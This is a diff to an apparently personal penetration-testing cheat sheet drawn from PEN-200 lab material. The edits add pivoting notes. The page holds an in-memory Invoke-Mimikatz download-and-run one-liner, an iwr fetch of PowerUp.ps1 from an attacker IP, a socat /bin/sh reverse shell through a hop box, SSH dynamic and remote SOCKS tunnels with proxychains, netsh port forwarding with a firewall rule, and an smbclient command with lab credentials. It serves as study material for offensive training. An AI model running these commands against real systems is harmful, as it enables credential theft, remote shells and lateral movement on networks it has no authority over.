@@ -20,7 +20,7 @@
     
     <div id="navbar-container"></div>
     <div class="main-container">
-        <div class="sidebar">
+        <div class="sidebar" style="width: 600px;">
             <h3>Quick content</h3>
             <ul id="sidebar-menu"></ul>
         </div>
@@ -336,6 +336,9 @@ python3 -m uploadserver 8000</code> </pre>
                  <pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com//PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')</code></pre>
                  <p>Run it directly in memory</p>
                  <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')</code></pre>
+                 <p>Using IWR</p>
+                 <pre><code class="language-powershell">iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1</code></pre>
+                   
                 </ul>
             </div>    
 
@@ -618,20 +621,6 @@ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9H
             </div>
 
             <div class="notion-header">
-                <h1 id="Port Forwarding chisel">Socat situations</h1>
-            </div>
-
-            <div class="banner">
-                <ul>
-                    <h2>Stuck in a network segment</h2>
-                    <ul>
-                        <p>Supose you are stuck in a machine were you can't reach even if you use ligolo. </p>
-                    </ul>
-                        
-                </ul>
-            </div>
-
-            <div class="notion-header">
                 <h1 id="Socat forwarding">Socat forwarding</h1>
             </div>
 
@@ -646,15 +635,64 @@ socat TCP-LISTEN:7777 stdout  #Victim machine
                     </ul>
 
                     <h2>Forwarding a Stream</h2>
+                    <ul>
                     <p>Here i show you how to forward the connection with a hop box. Here we have 3 box.</p>
                     <pre><code class="language-bash">socat file:`tty`,raw,echo=0 TCP-LISTEN:7777  #First box just listenning in port 7777
-                    socat TCP-LISTEN:4321,fork TCP:localhost:7777  #Second box or middle redirecting all traffic from port 4321 to port 7777
-                    socat EXEC:/bin/sh,pty,stderr,setsid,sigint,sane TCP:localhost:4321  #Third machine performing a connection using /bin/sh to port 4321</code></pre>
-                    
-
+socat TCP-LISTEN:4321,fork TCP:localhost:7777  #Second box or middle redirecting all traffic from port 4321 to port 7777
+socat EXEC:/bin/sh,pty,stderr,setsid,sigint,sane TCP:localhost:4321  #Third machine performing a connection using /bin/sh to port 4321</code></pre>
+                    </ul>    
                 </ul>
             </div>
 
+            <div class="notion-header">
+                <h1 id="SSH Tunneling">SSH Tunneling</h1>
+            </div>
+
+            <div class="banner">
+                <ul>
+                <h2>SSH Dynamic port forwarding</h2>
+                <ul>
+                    <p>Sice when performing port forwarding with socat we are only able to forward a single port the Dynamic method allow us to forward multiple ports dynamically.</p>
+                    <p>This is all performed using <b>proxychains</b></p>
+                    <img style="border: 1px solid; width: 100%;" src="https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/e124e9fa2b3ef61f10a94d88ceeedca7-PRAT2_3_0_SSHDynamicPortForwarding.png" >
+                    <p>From the box which is in the DMZ (Connectivity with internal and external network) perform an SSH connection to the box which is in the internal network. In this case we use the flag -D to specify it's dynamic</p>
+                    <pre><code class="language-bash">ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215</code></pre>
+                    <p>Edit the configuration of proxychains located at <b>/etc/proxychains4.conf</b> go to the end of the file and place the IP of the box which is in the DMZ and the port you have used previously</p>
+                    <pre><code class="language-bash">socks5 192.168.50.63 9999</code></pre>
+                    <p>Finally append the word <b>proxychains</b> to the command you would like to use and you'll be able to ping second interface from box 10.4.50.215</p>
+                    <pre><code class="language-bash">proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234</code></pre>
+                </ul>
+
+                <h2>SSH Remote Dynamic port forwarding</h2>
+                <ul>
+                    <p>Let extend our scenario again. This time we find a Windows server (MULTISERVER03) on the DMZ network. The firewall prevents us from connecting to any port on MULTISERVER03, or any port other than TCP/8090 on CONFLUENCE01 from our Kali machine. But we can SSH out from CONFLUENCE01 to our Kali machine, then create a remote dynamic port forward so we can start enumerating MULTISERVER03 from Kali.</p>
+                    <img style="border: 1px solid; width: 100%;" src="https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0237c8503fc5a185bd4d7fee7d601c44-PRAT2_5_1_SSHRemoteDynamicPortForwardingScenarioPlan.png" >
+                    <p>This is all performed using <b>proxychains</b></p>
+                    <p>Perform the a connection from CONFLUENCE01 to our Kali machine:</p>
+                    <pre><code class="language-bash">ssh -N -R 9998 kali@192.168.118.4</code></pre>
+                    <p>Edit the configuration of proxychains located at <b>/etc/proxychains4.conf</b> go to the end of the file and place the IP of the box which is in the DMZ and the port you have used previously</p>
+                    <pre><code class="language-bash">socks5 192.168.118.4 9998</code></pre>
+                    <p>Finally append the word <b>proxychains</b> to the command you would like to use and you'll be able to access multiserver03</p>
+                    <pre><code class="language-bash">proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234</code></pre>
+                 </ul>   
+            </div>
+
+            <div class="notion-header">
+                <h1 id="Windows netsh tunneling">Windows netsh tunneling</h1>
+            </div>
+
+            <div class="banner">
+                <ul>
+                    <h2>Windows netsh port forwarding</h2>
+                    <ul>
+                        <p>In case we have a windows machine and we want to forward a port we can use the command netsh. This is a simple example of how to forward a port</p>
+                        <pre><code class="language-bash">netsh interface portproxy add v4tov4 listenport=2222 listenaddress=IP_EXTERNAL_HOST connectport=22 connectaddress=IP_INTERNAL_HOST</code></pre>
+                        <p>In some cases we will have to add an aditional rule which will allow traffic through the firewall</p>
+                        <pre><code class="language-bash">netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow</code></pre>
+                        <p>Now run a query towards the port 2222 of the external host and test connectivity</p>
+                    </ul>       
+                </ul>
+            </div>                  
 
             <div class="notion-header">
                 <h1 id="Port Forwarding chisel">Port Forwarding chisel</h1>
